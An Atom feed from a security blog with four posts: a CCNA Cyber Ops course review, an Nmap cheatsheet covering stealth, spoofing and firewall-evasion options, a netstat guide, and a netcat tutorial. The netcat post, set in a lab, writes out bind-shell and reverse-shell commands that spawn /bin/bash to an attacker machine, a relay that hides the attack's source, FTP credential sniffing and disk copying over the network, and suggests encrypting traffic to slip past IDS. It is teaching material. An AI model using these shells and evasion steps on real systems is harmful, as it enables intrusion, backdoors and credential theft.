<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: networking | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/networking/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-11-17T08:21:04-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CCNA Cyber Ops review]]></title>
    <link href="http://chousensha.github.io/blog/2017/04/09/ccna-cyber-ops-review/"/>
    <updated>2017-04-09T03:11:41-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/04/09/ccna-cyber-ops-review</id>
    <content type="html"><![CDATA[<p>The Cisco Cybersecurity Scholarship program has concluded for the first cohort, and I have been fortunate enough to make it into the program! Now that the course and 2 exams are over, and I have a brand new certification, I thought I&rsquo;d share some info about what is covered in the CCNA Cyber Ops study materials.</p>

<!-- more -->


<p>First, I&rsquo;d like to thank Cisco for this amazing opportunity, and I wish more vendors would take their example. Yes, the latest exam price increase isn&rsquo;t nice, but this offering of a new certification&rsquo;s courses and exams to 10 000 people was an awesome move, especially for people who shared an interest in the security topics but wouldn&rsquo;t have gone to the certification path due to costs.</p>

<p>It also helped in bringing like-minded people together, creating communities and study groups over social media networks, and exchanging information about various security subjects.</p>

<p>So, what is this new CCNA that has the word &ldquo;cyber&rdquo; in it all about?</p>

<p><img class="center" src="/images/study/cyber.JPG" title="&lsquo;ccna cyber&rsquo; &lsquo;ccna cyber ops&rsquo;" ></p>

<p>The certification aims to prepare people for working as security analysts in a Security Operations Center. This is a blue-team focused certification, and here are the skills that it covers:</p>

<p><img class="center" src="/images/study/skills.JPG" title="&lsquo;ccna cyber skills&rsquo; &lsquo;ccna cyber ops skills&rsquo;" ></p>

<p>The scholarship consisted of 3 courses that had to be completed within 3 months, free vouchers for the 2 exams, and access to forums and mentors.</p>

<p><strong>Introduction to cybersecurity</strong></p>

<p>The first course was a very basic introductory course on what cybersecurity is and why it is needed. You can take it for free from Cisco&rsquo;s Networking Academy. This was a prerequisite for starting the other 2 courses that actually made up the certification part.</p>

<p><strong>Understanding Cisco cybersecurity fundamentals</strong></p>

<p>This second course was a blast! 14 sections, massive amount of material, both writen and videos, lots of information covered, I really enjoyed it! Some of it was review for me, but I also learned plenty of new things about DHCP relays, the CAPWAP protocol, the Security Onion suite, which is like the Kali of defensive security, and much more! The cryptograhpy section was excellently explained, and the Linux chapter might as well be a course in itself. Here&rsquo;s a list with some of the topics:</p>

<ul>
<li>networking stuff, protocols, attacks, devices</li>
<li>cryptography &ndash; detailed and easy to understand</li>
<li>general infosec concepts</li>
<li>web attacks</li>
<li>Windows and Linux sections with commands, filesystem structure, the ways the OS works, etc.</li>
<li>network and host security</li>
<li>various types of security devices and logs</li>
<li>different types of models that deal with threats</li>
</ul>


<p>A great addition to the study materials were the labs, where you could play with various OSes and tools in your browser, simulate attacks and react to different scenarios. It took a while for the labs to be initialized, but there were also walkthroughs for doing the lab, or skipping it altogether and following the steps instead.</p>

<p>You can find the exam topics for this course at <a href="https://learningnetwork.cisco.com/community/certifications/ccna-cyber-ops/secfnd/exam-topics">https://learningnetwork.cisco.com/community/certifications/ccna-cyber-ops/secfnd/exam-topics</a></p>

<p><strong>Implementing Cisco cybersecurity operations</strong></p>

<p>This course wasn&rsquo;t as big as the previous one, it had 13 sections and 2 appendices. It built up on the foundation of the other one, focusing on various aspects of incident response. It felt a bit rushed though, as it could have covered more material instead of breezing through, and the amount of typos that I found in it was pretty high. But overall, it was a good follow-up, and it had links for many resources where you could learn more. Some of the topics covered are:</p>

<ul>
<li>types of SOCs, NSM tools and data</li>
<li>incident analysis and threat hunting</li>
<li>CVSS scoring</li>
<li>data manipulation, correlation and normalization</li>
<li>incident detection and playbooks</li>
<li>incident response and automation</li>
</ul>


<p>The biggest problem that I faced before the exam was that the exam topics didn&rsquo;t follow the course content. Here is the exam guide: <a href="https://learningnetwork.cisco.com/community/certifications/ccna-cyber-ops/secops/exam-topics">https://learningnetwork.cisco.com/community/certifications/ccna-cyber-ops/secops/exam-topics</a></p>

<p>Fortunately, the mentors assigned to us were very helpful, and in addition to hosting webinars that reinforced the study material, they put together some documents that followed the exam blueprint and filled the gaps in information.</p>

<p>Overall, this has been a very interesting experience and I am happy to have participated in it! Again, hats off to Cisco for making this program available to security enthusiasts, and happy threat hunting!</p>

<p>``` plain</p>

<hr />

<p>/ You worry too much about your job. Stop \
\ it. You are not paid enough to worry.   /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nmap cheatsheet]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/31/nmap-cheatsheet/"/>
    <updated>2016-07-31T06:40:43-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/31/nmap-cheatsheet</id>
    <content type="html"><![CDATA[<p>Recently, I&rsquo;ve been reading Fyodor&rsquo;s <a href="https://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717">Nmap Network Scanning</a> book and decided to create an Nmap cheatsheet while at it.</p>

<p>Half of the book, including updated content, is also available for free on <a href="https://nmap.org/book/toc.html">https://nmap.org/book/toc.html</a></p>

<p>Fyodor was also nice enough to set up a machine that you can test your scans against (within reasonable limits), at <a href="http://scanme.nmap.org/">http://scanme.nmap.org/</a></p>

<p>All right, let&rsquo;s get scanning!</p>

<!-- more -->


<h1>Commands cheatsheet</h1>

<h2>Scan types</h2>

<p><strong>-sS</strong>: TCP SYN scan &ndash; the default scan, most popular due to its speed and stealth, as it doesn&rsquo;t complete a TCP connection</p>

<p><strong>-sT</strong>: TCP Connect scan, it uses the connect() system call, used by unprivileged users who can&rsquo;t send raw packets or when scanning IPv6 targets</p>

<p><strong>-sV</strong>: Version detection, omit for performance increase and/or stealth</p>

<p><strong>-sA</strong>: TCP ACK scan, can&rsquo;t tell if the ports are open or closed, but it can determine whether firewall rules are stateful or stateless</p>

<p><strong>-sW</strong>: TCP Window scan, same as ACK, but it can determine open and closed ports on certain systems</p>

<p><strong>-sM</strong>: Maimon scan, yet another special scan type for bypassing firewalls</p>

<p><strong>-sU</strong>: UDP scan. You can improve it by adding a version scan alongside it (but it will be slower)</p>

<p><strong>-sF</strong>: FIN scan, sets the FIN bit, useful in bypassing some firewalls and determining the target&rsquo;s OS between Windows and Unix types, as it doesn&rsquo;t work against Windows</p>

<p><strong>-sX</strong>: Xmas scan, another option for firewall evasion, sets the FIN, PSH, and URG flags, creating the impression of a lit Christmas tree</p>

<p><strong>-sN</strong>: Null scan, doesn&rsquo;t set any flags, an additional option to evade pesky firewalls</p>

<p><strong>-sO</strong>: IP protocol scan, check which IP protocols are supported on the target</p>

<p><strong>-b <FTP relay host></strong>: FTP bounce scan, also available to unprivileged users</p>

<p><strong>-A</strong>: Enable OS detection, version detection, script scanning, and traceroute</p>

<h3>Host discovery</h3>

<p><strong>List scan &ndash; sL</strong> &ndash; enumerates the addresses in the specified range and does reverse DNS lookup on them. Good for getting a feel about the targets by checking their DNS names, and maintaining a low profile on the network (because no ping requests are being sent yet, so it&rsquo;s stealthier)</p>

<p><strong>-p-</strong>: Shortcut for <em>-p1-65535</em></p>

<p><strong>-Pn</strong>: Treat all hosts as online &mdash; skip host discovery (disable ping)</p>

<p><strong>&mdash;exclude &lt;host1[,host2][,host3],&hellip;></strong>: Exclude hosts/networks</p>

<p><strong>-n</strong>: Never do DNS resolution</p>

<p><strong>-sP</strong>: perform a ping sweep</p>

<p><strong>-PS/PA/PU</strong>: TCP SYN ping/TCP ACK ping/UDP ping &ndash; various host discovery options for bypassing firewalls</p>

<h3>Performance</h3>

<p><strong>-T&lt;0-5></strong>: Set timing template (higher is faster). -T4 (aggressive) is recommended for most cases, as it improves performance and optimization for a fast and reliable network. For evasion purposes you can use T0 (paranoid) or T1 (sneaky), but speed will be very slow. To conserve bandwidth and resources you may use T2 (polite), at another significant expense of speed. T3 is the normal mode, and T5 is an insane level of speed (but you might sacrifice some accuracy in the process)</p>

<p><strong>-F</strong>: Fast scan, only scan most common 100 ports</p>

<h3>Evasion</h3>

<p><strong>-D &lt;decoy1,decoy2[,ME],&hellip;></strong>: Cloak a scan with decoys</p>

<p><strong>&mdash;scanflags <flags></strong>: Customize TCP scan flags. You can couple it with specifying a TCP scan type to give Nmap a base of interpreting the results</p>

<p><strong>-S &lt;IP_Address></strong>: Spoof source address</p>

<p><strong>-sI <zombie host[:probeport]></strong>: Idle scan, a complex scan that is stealthy but slow. It uses zombies to perform the scan, without sending packets directly from your IP. Use in tandem with the -PN option to disable ping and not disclose your real address. Avoid -sV, as version detection would also make your IP visible to the target</p>

<p><strong>-f; &mdash;mtu <val></strong>: fragment packets (optionally w/given MTU), can aid in bypassing firewalls that don&rsquo;t handle fragmentation well</p>

<p><strong>-g/&mdash;source-port <portnum></strong>: Spoof source port, bypass security measures that rely only on checking the source port</p>

<p><strong>&mdash;spoof-mac <mac address/prefix/vendor name></strong>: Spoof your MAC address</p>

<p><strong>&mdash;badsum</strong>: Send packets with a bogus TCP/UDP/SCTP checksum. Normal hosts discard packets with bad checksums, but firewalls may omit these checks for performance reasons</p>

<p><strong>&mdash;dns-servers &lt;serv1[,serv2],&hellip;></strong>: Specify custom DNS servers when doing reverse DNS lookup to avoid your DNS server showing up in the target&rsquo;s logs</p>

<h3>Additional info</h3>

<p><strong>-v</strong>: increase verbosity level, you can use it 2 or 3 times to further increase verbosity</p>

<p><strong>-d</strong>: Increase debugging level (use -dd or more for greater effect), can increase to a max of 9</p>

<p><strong>&mdash;packet-trace</strong>: print summary of every packet sent and received</p>

<h3>Output</h3>

<p><strong>-oN/-oX/-oS/-oG <file></strong>: Output scan in normal, XML, sCrIpt kIddi3, and Grepable format, respectively, to the given filename</p>

<p><strong>-oA <basename></strong>: Output in the three major formats at once</p>

<p><strong>&mdash;resume <filename></strong>: Resume an aborted scan</p>

<p>If you don&rsquo;t want Nmap to display its interactive output, you can pass a <em>&ndash;</em> to the format type(s), like so: <code>-oS &ndash;</code></p>

<h2>Useful tips</h2>

<ul>
<li><p><code>nmap -sL -n target</code> &ndash; list IPs to be scanned before actually scanning them</p></li>
<li><p><code>-pT:22,80,U:53</code> &ndash; scan separate TCP and UDP ports (you have to specify a UDP scan in addition to a TCP scan)</p></li>
<li><p><code>&mdash;version-intensity <level></code>: Set from 0 (light) to 9 (try all probes), setting it to 0 will limit the version detection to the most likely to succeed probes, and improve the speed of the scan</p></li>
<li><p>you can scan a network range by adding the subnet mask after an IP like so: <em>ip/numbits</em>. An example would be: 192.168.80.0/24, where the hosts between 192.168.80.0 and 192.168.80.255 would be scanned</p></li>
<li><p>version detection is noisy</p></li>
<li><p>you can specify port 0 for a scan, to catch malicious software that might listen on it</p></li>
</ul>


<h2>Script scanning</h2>

<p><strong>-sC</strong>: enable some common scripts, may be intrusive to the target</p>

<p><strong>&mdash;script</strong>=<Lua scripts>: <Lua scripts> is a comma separated list of directories, script-files or script-categories</p>

<p><a href="https://nmap.org/book/nse-usage.html">Currently defined categories</a> are:</p>

<ul>
<li><p><em>auth</em> &ndash; operations requiring authentication credentials</p></li>
<li><p><em>broadcast</em> &ndash; local network broadcasts</p></li>
<li><p><em>brute</em> &ndash; brute force attacks</p></li>
<li><p><em>default</em> &ndash; scripts that are run by default with -sC or -A options</p></li>
<li><p><em>discovery</em> &ndash; additional network information and enumeration</p></li>
<li><p><em>dos</em> &ndash; denial of service scripts</p></li>
<li><p><em>exploit</em> &ndash; exploitation of some specific vulnerability</p></li>
<li><p><em>external</em> &ndash; information may be sent to a third-party database or service</p></li>
<li><p><em>fuzzer</em> &ndash; fuzzing scripts</p></li>
<li><p><em>intrusive</em> &ndash; may crash the target system, consume excessive resources, or be perceived as malicious</p></li>
<li><p><em>malware</em> &ndash; test if the target is infected by malware or backdoors</p></li>
<li><p><em>safe</em> &ndash; general network discovery scripts that re unlikely to be resource intensive, crash a system, or lit the target logs on fire</p></li>
<li><p><em>version</em> &ndash; scripts that run only with -sV enabled</p></li>
<li><p><em>vuln</em> &ndash; check for specific vulnerabilities</p></li>
</ul>


<p>A full list of scripts and their description and usage can be found at <a href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a></p>

<p>Some notable scripts that you might use more often are listed below.</p>

<ul>
<li><p>dns-zone-transfer &ndash; requests a zone transfer from a DNS server</p></li>
<li><p>ftp-anon &ndash; checks if anonymous login is enabled on an FTP server and lists the root directory if yes</p></li>
<li><p>ftp-bounce &ndash; checks if FTP server allows port scanning via the bounce method</p></li>
<li><p>http-auth-finder &ndash; spiders a site to find pages containing form or HTTP authentication</p></li>
<li><p>http-backup-finder &ndash; spiders a site to find backups of discovered files</p></li>
<li><p>http-config-backup &ndash; searches for backups of web server and CMS configuration files</p></li>
<li><p>http-csrf &ndash; checks for forms vulnerable to CSRF</p></li>
<li><p>http-default-accounts &ndash; checks for default credentials in web applications, routers, and VOIP and security devices</p></li>
<li><p>http-devframework &ndash; checks for the underlying framework of a site</p></li>
<li><p>http-dlink-backdoor &ndash; checks for a firmware backdoor that is found in some D-Link routers</p></li>
<li><p>http-dombased-xss &ndash; searches for places susceptible to DOM-based XSS</p></li>
<li><p>http-drupal-enum-users &ndash; enumerates Drupal users</p></li>
<li><p>http-enum &ndash; enumerates common directories found in web apps</p></li>
<li><p>http-fileupload-exploiter &ndash; exploits file upload vulnerabilities</p></li>
<li><p>http-mobileversion-checker &ndash; checks if the site has a mobile version</p></li>
<li><p>http-open-redirect &ndash; checks for open redirects</p></li>
<li><p>http-passwd &ndash; checks for directory traversal</p></li>
<li><p>http-phpself-xss &ndash; finds PHP_SELF XSS vulnerabilities</p></li>
<li><p>http-rfi-spider &ndash; searches for RFI in forms and URL parameters</p></li>
<li><p>http-shellshock &ndash; checks if web app is vulnerable to shellshock</p></li>
<li><p>http-sitemap-generator &ndash; crawls a site and lists its directory structure and files</p></li>
<li><p>http-sql-injection &ndash; looks for SQLi in forms and URL parameters of HTTP servers</p></li>
<li><p>http-stored-xss &ndash; searches for unfiltered input that might lead to XSS</p></li>
<li><p>http-tplink-dir-traversal &ndash; on certain TPLINK routers that are vulnerable to directory traversal, it can read remote files with no authentication required</p></li>
<li><p>http-unsafe-output-escaping &ndash; crawls a site looking for where improperly escaped data is reflected back to the user</p></li>
<li><p>http-vuln-cve2012-1823 &ndash; attempts to exploit vulnerable PHP CGI apps that allow remote code execution</p></li>
<li><p>http-vuln-cve2015-1635 &ndash; checks for the MS15-034 RCE vulnerability in Windows machines</p></li>
<li><p>http-waf-detect &ndash; tries to detect IDS / IPS / WAF protection on the target</p></li>
<li><p>http-waf-fingerprint &ndash; attempts to fingerpring the WAF</p></li>
<li><p>http-webdav-scan &ndash; WebDAV detection</p></li>
<li><p>ipidseq &ndash; tests for suitable zombies to be used in idle scan</p></li>
<li><p>mongodb-databases &ndash; enumerates MongoDB tables</p></li>
<li><p>ms-sql-empty-password &ndash; tries to login as the sa account with no password on MS-SQL</p></li>
<li><p>mysql-empty-password &ndash; checks for MySQL servers with empty password for the root or anonymous account</p></li>
<li><p>samba-vuln-cve-2012-1182 &ndash; checks if Samba server is vulnerable to CVE-2012-1182 heap overflow</p></li>
<li><p>shodan-api &ndash; uses Shodan (API key needed) to scan targets in a way similar to the -sV scan</p></li>
<li><p>sniffer-detect &ndash; checks if a NIC on the local network is in promiscuous mode</p></li>
<li><p>ssl-heartbleed &ndash; checks for the Heartbleed vulnerability</p></li>
<li><p>ssl-poodle &ndash; checks for the Poodle vulnerability</p></li>
<li><p>tor-consensus-checker &ndash; checks if target host is a Tor node</p></li>
<li><p>traceroute-geolocation &ndash; performs geolocation on traceroute hops</p></li>
</ul>


<p>Many thanks to Fyodor for creating such an awesome tool and freely sharing with everyone! As you can see, Nmap is so much more than just a port scanner. You can easily perform some sort of vulnerability analysis and exploitation with it, and if there is no task that you would like Nmap to do and it can&rsquo;t, you can write the code yourself and contribute to this amazing project.</p>

<p>``` plain
/ You have the capacity to learn from \
\ mistakes. You&rsquo;ll learn a lot today. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Network tools - netstat]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/11/network-tools-netstat/"/>
    <updated>2014-06-11T14:14:59-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/11/network-tools-netstat</id>
    <content type="html"><![CDATA[<p>Netstat is a very important tool for gathering information about the connections on a machine or troubleshooting network problems. It&rsquo;s a default utility for both Windows and Linux, thus there is no excuse in not getting familiar with it, it&rsquo;s very useful for any system admin, network guy or good old home user that would like to know what really is coming and going to and from his computer.</p>

<!-- more -->


<p>If ran with no arguments, netstat produses an overwhelming output of all the open sockets in the system. Here is its <em>man</em> page description:</p>

<blockquote><p>netstat  &ndash; Print network connections, routing tables, interface statistics,
masquerade connections, and multicast memberships</p></blockquote>

<p>Netstat is great when run with specific flags to zoom in on the information that is relevant to us. Here are some examples:</p>

<p><strong>Display the PID and the name of the program to which eack socket belongs, along with the path</strong></p>

<p><img class="center" src="/images/netstat-p.png" title="&lsquo;netstat -p&rsquo; &lsquo;netstat &mdash;program&rsquo;" ></p>

<p><strong>Display only listening sockets</strong></p>

<p><img class="center" src="/images/netstat-l.png" title="&lsquo;netstat -l&rsquo; &lsquo;netstat &mdash;listening&rsquo;" ></p>

<p><strong>Display all ports (both listening and non-listening</strong></p>

<p><img class="center" src="/images/netstat-a.png" title="&lsquo;netstat -a&rsquo; &lsquo;netstat &mdash;all&rsquo;" ></p>

<p><strong>Display listening sockets and established connections</strong></p>

<p><img class="center" src="/images/netstat-ap.png" title="&lsquo;netstat -ap&rsquo; &lsquo;netstat -ap&rsquo;" ></p>

<p><strong>Display TCP ports and connections</strong></p>

<p><img class="center" src="/images/netstat-at.png" title="&lsquo;netstat -at&rsquo; &lsquo;netstat tcp&rsquo;" ></p>

<p><strong>Display TCP statistics</strong></p>

<p><img class="center" src="/images/netstat-st.png" title="&lsquo;netstat -st&rsquo; &lsquo;netstat stats&rsquo;" ></p>

<p><strong>Display kernel routing tables</strong></p>

<p><img class="center" src="/images/netstat-r.png" title="&lsquo;netstat -r&rsquo; &lsquo;netstat route&rsquo;" ></p>

<p><strong>Display all TCP connections and listening ports using numeric values for addresses and ports, instead of resolving their names</strong></p>

<p><img class="center" src="/images/netstat-antp.png" title="&lsquo;netstat -antp&rsquo; &lsquo;netstat antp&rsquo;" ></p>

<blockquote><p>Q:    Why is Poland just like the United States?
A:    In the United States you can&rsquo;t buy anything for zlotys and in
  Poland you can&rsquo;t either, while in the U.S. you can get whatever
  you want for dollars, just as you can in Poland.
  &mdash; being told in Poland, 1987</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Network tools - Netcat]]></title>
    <link href="http://chousensha.github.io/blog/2014/05/30/network-tools-netcat/"/>
    <updated>2014-05-30T17:20:29-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/05/30/network-tools-netcat</id>
    <content type="html"><![CDATA[<p>In this tutorial I will cover some of the uses of netcat, known as the &ldquo;TCP/IP Swiss army knife&rdquo;. Netcat is a very powerful and versatile tool that can be used in diagnosing network problems or in penetration testing.</p>

<!-- more -->


<p>There are many netcat variations, some are more recent and have been rewritten to include more features. Let&rsquo;s look at the original netcat man page:</p>

<blockquote><p>netcat is a simple unix utility which reads and writes data across net-
work connections, using TCP or UDP protocol. It is  designed  to  be  a
reliable  &ldquo;back-end&rdquo; tool that can be used directly or easily driven by
other programs and scripts.  At the same time,  it  is  a  feature-rich
network  debugging and exploration tool, since it can create almost any
kind of connection you would need and has several interesting  built-in
capabilities.</p></blockquote>

<p>Ok, so let&rsquo;s see some of the many ways we can use netcat.</p>

<h3>Banner grabbing</h3>

<p>First, let&rsquo;s see what we can glean from using netcat to connect to an FTP server:</p>

<p><code>plain
nc 192.168.127.130 21
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 17:23. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
</code></p>

<p>As you can see, there is some information available about the server, including the type of the FTP server, the number of logged in users and the maximum number allowed, the local time of the system, the fact that anonymous logins are disallowed, and that it&rsquo;s possible to connect via IPv6. Depending on the configuration of a server, the information disclosed could be pretty detailed, or sparse and misleading, as to not give away too much info to a potential attacker.</p>

<p>Now let&rsquo;s try banner grabbing from an HTTP server by sending a HEAD request:</p>

<p>``` plain
nc 192.168.127.130 80
HEAD / HTTP/1.0</p>

<p>HTTP/1.1 200 OK
Date: Fri, 21 Feb 2014 17:51:58 GMT
Server: Apache/2.2.14 (Ubuntu)
Last-Modified: Tue, 10 May 2011 16:01:46 GMT
ETag: &ldquo;27bda-b1-4a2ee12abae80&rdquo;
Accept-Ranges: bytes
Content-Length: 177
Vary: Accept-Encoding
Connection: close
Content-Type: text/html
```</p>

<p>This information can vary as well, this time the bit we&rsquo;re interested in is the server version and the operating system. Sometimes there is more to be discovered, like the PHP version that powers the server etc.</p>

<h3>Chat server</h3>

<p>Let&rsquo;s now look at how easy it is to use netcat for a very simple chat server.</p>

<p><code>plain
nc -v -l -p 4444
listening on [any] 4444 ...
</code></p>

<p>In the above command I told netcat to listen on port 4444. The -v flag is for more verbose output.</p>

<p>Now, from a different terminal window (or machine), connect to that port with netcat and start typing stuff. You will see the output being echoed in the server window. If you type stuff back from the server window, you will see it printed in the client window:</p>

<p><img class="center" src="/images/nc_chat.png" title="&lsquo;nc_chat&rsquo; &lsquo;chat&rsquo;" ></p>

<h3>File transfer</h3>

<p>To transfer files between 2 machines, netcat can be used in the following way. On one computer, let&rsquo;s tell netcat to listen on a port and push a file to the socket:</p>

<p><code>plain
nc -v -l -p 4444 &lt; confidential.txt
listening on [any] 4444 ...
</code></p>

<p>Bascially, this takes the file and pushes it on the listening socket, ready to be pulled by a client that connects to that port. Now, from another computer, connect to the listener and redirect whatever you receive to a file:</p>

<p><code>plain
nc -v 192.168.127.130 4444 &gt; transfer.txt
192.168.127.130: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.127.130] 4444 (?) open
</code></p>

<p>Now we can check that we have a new file named transfer.txt which has the same contents as the file that was offered by the server, confidential.txt. Note that netcat doesn&rsquo;t give any indication of the transfer progress or its completion.</p>

<h3>Port scanning</h3>

<p>Netcat can also be used as a very basic port scanner:</p>

<p><code>plain
nc -v -n -z -w1 192.168.127.130 1-1000
(UNKNOWN) [192.168.127.130] 80 (www) open
(UNKNOWN) [192.168.127.130] 21 (ftp) open
</code></p>

<p>Here we scanned the range of ports between 1 and 1000 and we determined that ports 21 and 80 are open. The -n switch disables DNS lookup, the -z is for not sending any data, thus reducing the time it requires to talk to the ports. And the -w1 tells netcat to wait 1 second before determining that a connection occurred. This is a TCP only scan. For UDP, add the -u flag.</p>

<h3>Port forwarding</h3>

<p>Netcat&rsquo;s port forwarding ability could be useful in a variety of scenarios, from bypassing traffic restrictions in a secure environment to using a proxy (or more) to conduct a MITM attack.</p>

<p>For this example, I will be using the following:</p>

<p>``` plain</p>

<pre><code>Attacker machine: 192.168.127.133
Relaying machine: 192.168.127.130
Victim machine: 192.168.127.129
</code></pre>

<p>```</p>

<p>On the relay, use the following command:</p>

<p><code>plain
nc -l -p 4444 -c "nc 192.168.127.129 22"
</code></p>

<p>This sets up a listener on port 4444. The -c flag specifies a shell command to be executed by the /bin/sh shell (if the system doesn&rsquo;t have such a shell, you can use the -e flag to execute a command or file instead. On a Windows machine, for instance, you could run cmd.exe or a batch file containing your desired commands). So, in the above, the proxy will forward connections it receives on port 4444 to the victim machine on port 22.</p>

<p>From the attacker machine, connect to the proxy:</p>

<p><code>plain
nc 192.168.127.130 4444
SSH-2.0-OpenSSH_5.9
</code></p>

<p>Bingo! We can see that there is an SSH server waiting for someone to log in. On the victim machine, let&rsquo;s confirm that we have a connection:</p>

<p><code>plain
netstat -antp | grep 22
tcp        0      0 192.168.127.129:22      192.168.127.130:43583   ESTABLISHED -
</code></p>

<p>So the victim is unaware of the real source of the connection! It sees the connection as originating from the relay machine.</p>

<h3>Remote backdoor &ndash; Bind shell</h3>

<p>Once an attacker has exploited a victim machine, he may want to return afterwards and have a nice, cozy backdoor waiting for him. If there is a direct connection between the 2 machines, netcat can be used to bind a shell to a port and wait for the attacker to connect. The shell will have the privileges of the user who spawned it, so it&rsquo;s best to have administrative privileges for full power over the system.</p>

<p>On the machine you want to backdoor, use netcat to bind the shell:</p>

<p><code>plain
nc -v -l -p 5555 -e /bin/bash
</code></p>

<p>Now from another machine, use netcat to connect to it on that port and your shell will be waiting for you. Keep in mind there won&rsquo;t be any prompt or anything like that. Just type commands in the terminal.</p>

<p><img class="center" src="/images/nc_bindshell.png" title="&lsquo;nc_bindshell&rsquo; &lsquo;Bind shell&rsquo;" ></p>

<h3>Reverse shell</h3>

<p>The more common way to use netcat for backdooring is to spawn a reverse shell that connects back to the atacker. This is useful in case the victim is behind a NAT or in a protected internal network that can&rsquo;t be directly accessed from the internet.</p>

<p>So, let&rsquo;s get on with it and start a listener on the attacking machine:</p>

<p><code>plain
nc -v -l -n -p 5555
listening on [any] 5555 ...
</code></p>

<p>Now let&rsquo;s connect from the victim machine:</p>

<p><code>plain
nc -v -n 192.168.127.130 5555 -e /bin/bash
(UNKNOWN) [192.168.127.130] 5555 (?) open
</code></p>

<p>Basically, the victim machine sent the attacker a shell, and now we control the victim again. I used the -n switch as well to disable all those pesky inverse lookups.</p>

<p><img class="center" src="/images/nc_reverse.png" title="&lsquo;nc_reverse&rsquo; &lsquo;reverse shell&rsquo;" ></p>

<h3>Honeypot</h3>

<p>It is possible to set up a very simple honeypot using netcat. I grabbed the banner for the Pure-FTPd server and copied it to a file called banner.txt. Now start listening on port 21 and serve that banner for visitors:</p>

<p><code>plain
nc -vv -l -n -p 21 &lt; banner.txt | cat &gt; log.txt
</code></p>

<p>The additional -v flag is for extra verbosity and the data received is piped to a log file. Now, from another machine, let&rsquo;s connect to port 21 and see what we get:</p>

<p><img class="center" src="/images/nc_honeypot.png" title="&lsquo;nc_honeypot&rsquo; &lsquo;honeypot&rsquo;" ></p>

<p>Here we&rsquo;re seeing the familiar FTP banner even though there&rsquo;s no real FTP server running. We send some random data and now let&rsquo;s check on the other machine that this data has been logged:</p>

<p><img class="center" src="/images/nc_log.png" title="&lsquo;nc_log&rsquo; &lsquo;Log output&rsquo;" ></p>

<p>Of course, you might want netcat to keep on listening and not stop after every connection. Consider writing a script for that or look into versions that have continuous connection options.</p>

<h3>Sniffer</h3>

<p>Netcat can also be used to sniff traffic from a specific port. One machine has Pure-FTPd running on port 21. On the same machine, we&rsquo;ll use netcat to listen on some other port and execute a script:</p>

<p><code>plain
nc -l -p 4444 -n -vv -e /root/sniff
listening on [any] 4444 ...
</code></p>

<p>The script file contains the following:</p>

<p>``` plain</p>

<h1>!/bin/bash</h1>

<p>nc -o /root/log 192.168.127.130 21
```</p>

<p>The -o flag is for hex dumping the traffic. This script tells netcat to hex dump the traffic that comes to port 21 and write it to the /root/log file. And on the command line I used netcat to listen on port 4444 and call this script. Now let&rsquo;s try connecting from another machine to the port that netcat listens on:</p>

<p><img class="center" src="/images/nc_ftp.png" title="&lsquo;nc_ftp&rsquo; &lsquo;FTP&rsquo;" ></p>

<p>Since this is a test lab and I already knew about the FTP server being sniffed, I tried to log in directly.</p>

<p>Let&rsquo;s check what got logged on the other machine:</p>

<p><em>cat /root/log | more</em></p>

<p><img class="center" src="/images/nc_hex.png" title="&lsquo;nc_hexdump&rsquo; &lsquo;dump&rsquo;" ></p>

<p>There we go! We have a file containing the traffic to port 21, and we can see the attempt to log in has failed with the given credentials. But when a legitimate user will log in, we will have the right username and password.</p>

<h3>Disk cloning</h3>

<p>Yes, you can even copy hard disks over the network with netcat, in conjunction with the <em>dd</em> program.</p>

<p>On the system that you want to copy from, run this:</p>

<p><code>plain
dd if=/dev/sda | nc 192.168.127.130 5555
</code></p>

<p>And on the machine you&rsquo;re copying to:</p>

<p><code>plain
nc -l -p 5555 | dd of=/dev/sda
</code></p>

<p>Be careful when performing operations on hard drives, best to test them on virtual machines first than realizing you just wiped your HDD.</p>

<p>I hope by now you realize how powerful netcat can be and its usefulness in a variety of scenarios. Of course, during a real penetration test or uhm, hack attempt, you will probably want to encrypt your traffic with cryptcat or something, since by now, all the IDS vendors are including signatures for netcat. Also, the examples were kept simple for ease of understanding, but in the real world netcat would be chained together with other tools to create complex and stealthy attacks.</p>

<blockquote><p>If more of us valued food and cheer and song above hoarded gold, it would
be a merrier world.
&mdash; J.R.R. Tolkien</p></blockquote>
]]></content>
  </entry>
  
</feed>
